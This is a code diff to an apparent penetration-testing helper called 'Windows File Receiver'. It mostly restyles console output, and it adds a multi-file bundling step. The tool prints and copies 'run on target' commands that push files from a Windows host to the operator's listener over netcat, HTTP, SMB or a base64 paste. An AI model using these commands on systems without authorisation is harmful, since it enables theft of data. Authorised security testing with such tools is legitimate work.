@@ -3,8 +3,16 @@ import shutil
 import socket
 import subprocess
 import sys
+import zipfile
 
 from pathlib import Path
+
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich import box
+
+console = Console()
 
 
 # =========================================================
@@ -90,13 +98,28 @@ def require_outfile(args):
 
     if not outfile:
 
-        print(
-            f"\n{R}[!] Missing output filename{W}"
-        )
+        console.print("[red][!] Missing output filename[/red]")
 
         return None
 
     return Path(outfile)
+
+
+def _print_script(lines, title):
+
+    #
+    # No box — a bordered panel puts a leading "│" on every line, which a
+    # drag-select-to-copy off the terminal (no clipboard access, over SSH,
+    # etc.) would grab too. A rule frames it without touching the text.
+    #
+    console.print()
+    console.rule(f"[bold yellow]▸ {title}[/bold yellow]", style="yellow", align="left")
+    console.print()
+
+    for line in lines:
+        console.print(f"[bold yellow]{line}[/bold yellow]", soft_wrap=True, highlight=False)
+
+    console.print()
 
 
 # =========================================================
@@ -109,27 +132,25 @@ def mode_nc(
     port
 ):
 
+    #
+    # PowerShell reserves "<" for input redirection but has never
+    # implemented it (RedirectionNotSupported, every version) — cmd.exe
+    # is the only shell that actually honors it. Wrapping in cmd /c makes
+    # this work from a PowerShell prompt too, without changing behavior
+    # if already in cmd.exe.
+    #
     cmd = (
-        f'nc {ip} {port} '
-        f'< {outfile.name}'
+        f'cmd /c "nc {ip} {port} '
+        f'< {outfile.name}"'
     )
 
-    print(
-        f"\n{M}=== NC ==={W}\n"
-    )
-
-    print(cmd)
+    _print_script([cmd], "RUN ON TARGET — PowerShell")
 
     copy_clipboard(cmd)
 
-    print(
-        f"\n{G}→ helper copied to clipboard{W}"
-    )
-
-    print(
-        f"\n{Y}[*] Listening "
-        f"{ip}:{port} -> {outfile}{W}"
-    )
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
+    console.print(f"[yellow][*] Listening {ip}:{port} -> {outfile}[/yellow]", highlight=False)
 
     subprocess.run(
         f"nc -lvnp {port} > '{outfile}'",
@@ -154,21 +175,13 @@ def mode_http(
         f"-InFile {outfile.name}"
     )
 
-    print(
-        f"\n{M}=== HTTP ==={W}\n"
-    )
-
-    print(cmd)
+    _print_script([cmd], "RUN ON TARGET — PowerShell")
 
     copy_clipboard(cmd)
 
-    print(
-        f"\n{G}→ PowerShell command copied to clipboard{W}"
-    )
-
-    print(
-        f"\n{Y}[*] Listening on {port}...{W}"
-    )
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
+    console.print(f"[yellow][*] Listening on {port}...[/yellow]", highlight=False)
 
     tmp = Path(
         f"{outfile}.tmp"
@@ -201,9 +214,7 @@ def mode_http(
         missing_ok=True
     )
 
-    print(
-        f"\n{G}[+] Saved -> {outfile}{W}"
-    )
+    console.print(f"[green][+] Saved -> {outfile}[/green]", highlight=False)
 
 
 # =========================================================
@@ -230,22 +241,13 @@ def mode_smb(
         f"{outfile.name}"
     )
 
-    print(
-        f"\n{M}=== SMB ==={W}\n"
-    )
-
-    print(cmd)
+    _print_script([cmd], "RUN ON TARGET — cmd")
 
     copy_clipboard(cmd)
 
-    print(
-        f"\n{G}→ helper copied to clipboard{W}"
-    )
-
-    print(
-        f"\n{Y}[*] Starting SMB share "
-        f"/{share}{W}"
-    )
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
+    console.print(f"[yellow][*] Starting SMB share /{share}[/yellow]", highlight=False)
 
     try:
 
@@ -286,22 +288,14 @@ def mode_offline(
         ")"
     )
 
-    print(
-        f"\n{M}=== OFFLINE ==={W}\n"
-    )
-
-    print(cmd)
+    _print_script([cmd], "RUN ON TARGET — PowerShell")
 
     copy_clipboard(cmd)
 
-    print(
-        f"\n{G}→ helper copied to clipboard{W}"
-    )
-
-    print(
-        "\nPaste base64 "
-        "(Ctrl-D when done)\n"
-    )
+    console.print("[green]→ copied to clipboard[/green]")
+    console.print()
+    console.print("[bold blue][*][/bold blue] Paste the base64 output below (Ctrl-D when done):")
+    console.print()
 
     data = (
         sys.stdin
@@ -316,10 +310,7 @@ def mode_offline(
         base64.b64decode(data)
     )
 
-    print(
-        f"\n{G}[+] Decoded and saved "
-        f"to: {outfile}{W}"
-    )
+    console.print(f"[green][+] Decoded and saved to: {outfile}[/green]", highlight=False)
 
 
 # =========================================================
@@ -328,37 +319,33 @@ def mode_offline(
 
 def choose_mode():
 
-    print(
-        f"\n{W_BOLD}"
-        f"[*] WINDOWS FILE RECEIVER"
-        f"{W}"
+    table = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
+    table.add_column(style="bold cyan", no_wrap=True)
+    table.add_column(style="white")
+    table.add_column(style="dim")
+
+    table.add_row("[1] HTTP", "POST upload", "one-shot receiver, decodes on arrival")
+    table.add_row("[2] NC", "raw netcat", "simplest, needs an open listener port")
+    table.add_row("[3] SMB", "impacket share", "target copies straight to a share")
+    table.add_row("[4] Offline", "base64 paste", "no network in/out at all")
+
+    console.print()
+    console.print(
+        Panel(
+            table,
+            title="[bold white]WINDOWS FILE RECEIVER[/bold white]",
+            title_align="left",
+            border_style="blue",
+            box=box.ROUNDED,
+            padding=(1, 2),
+        )
     )
 
-    print(
-        f"\n  {B}[1]{W} NC"
-    )
-
-    print(
-        f"  {B}[2]{W} HTTP"
-    )
-
-    print(
-        f"  {B}[3]{W} SMB"
-    )
-
-    print(
-        f"  {B}[4]{W} Offline Base64"
-    )
-
-    print()
-
-    choice = input(
-        f"{B}select{W}> "
-    ).strip()
+    choice = input(f"\n{B}select> {W}").strip()
 
     return {
-        "1": "nc",
-        "2": "http",
+        "1": "http",
+        "2": "nc",
         "3": "smb",
         "4": "offline",
     }.get(choice)
@@ -420,6 +407,56 @@ def receive_windows_file(
         mode_offline(
             outfile
         )
+
+
+def receive_windows_files(
+    outfiles,
+    archive_name="bundle.zip",
+    method=None,
+    ip=None,
+    port=None,
+    share="data"
+):
+
+    #
+    # One archive instead of N separate transfers — the target zips
+    # everything into a single file, so only one on-target command needs
+    # copy-pasting regardless of how many files are involved.
+    #
+    outfiles = [Path(f) for f in outfiles]
+
+    file_list = ", ".join(f'"{f.name}"' for f in outfiles)
+
+    cmd = (
+        f"Compress-Archive -Path {file_list} "
+        f"-DestinationPath {archive_name} -Force"
+    )
+
+    _print_script([cmd], "RUN ON TARGET — PowerShell (bundle before sending)")
+
+    copy_clipboard(cmd)
+
+    console.print("[green]→ copied to clipboard[/green]")
+
+    archive_path = Path(archive_name)
+
+    receive_windows_file(
+        outfile=archive_path,
+        method=method,
+        ip=ip,
+        port=port,
+        share=share
+    )
+
+    if not archive_path.is_file():
+        return
+
+    with zipfile.ZipFile(archive_path) as zf:
+        zf.extractall(".")
+
+    archive_path.unlink(missing_ok=True)
+
+    console.print("[green][+] Extracted archive contents[/green]", highlight=False)
 
 
 def run(
